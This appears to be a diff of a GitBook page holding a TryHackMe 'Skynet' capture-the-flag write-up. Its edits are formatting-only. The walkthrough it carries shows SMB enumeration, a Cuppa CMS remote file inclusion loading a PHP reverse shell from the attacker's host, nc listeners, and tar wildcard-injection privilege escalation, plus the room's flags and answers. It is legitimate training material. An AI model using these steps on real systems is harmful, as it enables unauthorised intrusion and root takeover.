@@ -48,7 +48,7 @@ PORT      STATE    SERVICE     REASON         VERSION
 
 Going to the website, I see:
 
-![](../../.gitbook/assets/image%20%28181%29.png)
+![](<../../.gitbook/assets/image (181).png>)
 
  I then ran feroxbuster on the IP address:
 
@@ -84,11 +84,11 @@ This resulted in:
 
 One of the links led me to a site:
 
-![](../../.gitbook/assets/image%20%28170%29.png)
+![](<../../.gitbook/assets/image (170).png>)
 
 I then viewed the hint for the first question:
 
-![](../../.gitbook/assets/image%20%28171%29.png)
+![](<../../.gitbook/assets/image (171).png>)
 
 I then realized I will have to go with this route first. Looking back at the nmap scan, we see that port **445** seems to be for Samba. Using **enum4linux**, I saw the following shares:
 
@@ -109,33 +109,33 @@ S-1-5-21-2393614426-3774336851-1116533619-513 SKYNET\None (Domain Group)
 
 The enum4linux information is verified by **smbmap**:
 
-![](../../.gitbook/assets/image%20%28178%29.png)
+![](<../../.gitbook/assets/image (178).png>)
 
 There seems to be read access to they anonymous disk. Using **smbclient** I was able to see a couple files:
 
-![](../../.gitbook/assets/image%20%28180%29.png)
+![](<../../.gitbook/assets/image (180).png>)
 
 There was also a directory called **logs**:
 
-![](../../.gitbook/assets/image%20%28179%29.png)
+![](<../../.gitbook/assets/image (179).png>)
 
 I downloaded all of those files to my local machine using "**mget \*"**. I viewed all of the downloaded files. 
 
-![](../../.gitbook/assets/image%20%28175%29.png)
+![](<../../.gitbook/assets/image (175).png>)
 
-The **log** files seemed to contain passwords. I went back to the mail site and entered the username **milesdyson** and password **cyborg007haloterminator** and I got in:
+The **log** files seemed to contain passwords. I went back to the mail site and entered the username **milesdyson** and password **cyborg007haloterminator **and I got in:
 
 > What is Miles password for his emails? **cyborg007haloterminator**
 
-![](../../.gitbook/assets/image%20%28182%29.png)
+![](<../../.gitbook/assets/image (182).png>)
 
 There does seem to be another user here **serenakogan**. I kept that in my notes just for future reference. The email from **skynet@skynet** seemed to have some interesting information in it:
 
-![](../../.gitbook/assets/image%20%28174%29.png)
+![](<../../.gitbook/assets/image (174).png>)
 
 Using that password, I was able to log into miles' samba share:
 
-![](../../.gitbook/assets/image%20%28173%29.png)
+![](<../../.gitbook/assets/image (173).png>)
 
 In the **notes** directory, I found a file called **important.txt**. In it it contained the following information:
 
@@ -153,7 +153,7 @@ This points us to the answer for our next question.
 
 Visiting that directory online leads to a new page:
 
-![](../../.gitbook/assets/image%20%28177%29.png)
+![](<../../.gitbook/assets/image (177).png>)
 
 I then ran **feroxbuster** again on this directory leading to the following results:
 
@@ -171,11 +171,11 @@ I then ran **feroxbuster** again on this directory leading to the following resu
 
 I then found this site using the link of http://10.10.224.214/45kra24zxs28v3yd/administrator/:
 
-![](../../.gitbook/assets/image%20%28168%29.png)
+![](<../../.gitbook/assets/image (168).png>)
 
 Using **searchsploit**, I then realized that there was a exploit for this CMS, and it is Remote File Inclusion!
 
-![](../../.gitbook/assets/image%20%28169%29.png)
+![](<../../.gitbook/assets/image (169).png>)
 
 I then copied that file locally running:
 
@@ -259,7 +259,7 @@ http://10.10.224.214/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?
 
 I then got an output! 
 
-![](../../.gitbook/assets/image%20%28183%29.png)
+![](<../../.gitbook/assets/image (183).png>)
 
 If you decode the whole string using Base64, you get the following:
 
@@ -284,24 +284,24 @@ If you decode the whole string using Base64, you get the following:
 ?>
 ```
 
-Here, we can see the username and password. I looked back at the nmap scan and realized that port 22 \(SSH\) is open. Maybe this is a password for that. It was not. After I was stuck for a while, I viewed the writeup [here,](https://medium.com/@shaifi.moazzem/try-hack-me-skynet-w-o-metasploit-f25561a0ff16) and realized that I have to access the file using the URL. For that, I found the php-reverse-shell file, and then edited the IP address and port number. I then ran two commands on two different terminals:
+Here, we can see the username and password. I looked back at the nmap scan and realized that port 22 (SSH) is open. Maybe this is a password for that. It was not. After I was stuck for a while, I viewed the writeup [here,](https://medium.com/@shaifi.moazzem/try-hack-me-skynet-w-o-metasploit-f25561a0ff16) and realized that I have to access the file using the URL. For that, I found the php-reverse-shell file, and then edited the IP address and port number. I then ran two commands on two different terminals:
 
 ```c
 python -m SimpleHTTPServer 80 //To serve the file to the Cuppa CMS
 nc -lvnp 1234 //To get the reverse connection
 ```
 
-I was able to get a reverse shell after visiting [http://10.10.224.214/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.54.229/hello.php](http://10.10.224.214/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.54.229/hello.php) \(hello.php is what I renamed my php reverse shell to\):
+I was able to get a reverse shell after visiting [http://10.10.224.214/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.54.229/hello.php](http://10.10.224.214/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.54.229/hello.php) (hello.php is what I renamed my php reverse shell to):
 
-![](../../.gitbook/assets/image%20%28176%29.png)
+![](<../../.gitbook/assets/image (176).png>)
 
 I was able to move around and find the user flag:
 
-![](../../.gitbook/assets/image%20%28167%29.png)
+![](<../../.gitbook/assets/image (167).png>)
 
 > What is the user flag? **7ce5c2109a40f958099283600a9ae807**
 
-I then had the user file. I then had to get the root file. I referenced the same write-up mentioned above to see what they did for this. The author ends up using [https://gtfobins.github.io/gtfobins/tar/\#shell](https://gtfobins.github.io/gtfobins/tar/#shell) in order to get a root shell. I was again lost, and ended up finding the write-up at this page, and they ran the following commands:
+I then had the user file. I then had to get the root file. I referenced the same write-up mentioned above to see what they did for this. The author ends up using [https://gtfobins.github.io/gtfobins/tar/#shell](https://gtfobins.github.io/gtfobins/tar/#shell) in order to get a root shell. I was again lost, and ended up finding the write-up at this page, and they ran the following commands:
 
 ```c
 cd /var/www/html
@@ -312,9 +312,8 @@ touch "/var/www/html/--checkpoint=1"
 
 You then run **rlwrap nc -nvlp 443** in order to wait for the crobjob to run**:**
 
-![](../../.gitbook/assets/image%20%28172%29.png)
+![](<../../.gitbook/assets/image (172).png>)
 
 You then get the root flag.
 
 > What is the root flag? **3f0372db24753accc7179a282cd6a949**
-
